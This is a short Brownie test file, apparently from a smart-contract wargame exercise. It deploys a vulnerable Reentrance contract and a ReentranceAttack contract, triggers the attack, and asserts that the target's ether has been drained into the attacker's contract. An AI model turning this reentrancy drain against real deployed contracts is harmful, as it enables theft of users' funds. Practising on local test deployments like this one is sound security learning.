from brownie import accounts, Reentrance, ReentranceAttack

def test_attack():
    owner = accounts[0]
    hacker = accounts[1]
    amount = "0.001 ether"
    target = Reentrance.deploy({'from': owner})
    hack = ReentranceAttack.deploy(target.address, amount, {'from': hacker})
    target.donate(hack.address, {'from': hacker, 'amount': amount})
    owner.transfer(target.address, "0.001 ether")
    assert hack.balance() == 0
    assert target.balance() != 0
    hack.attack({'from': hacker})
    assert target.balance() == 0
    assert hack.balance() != 0
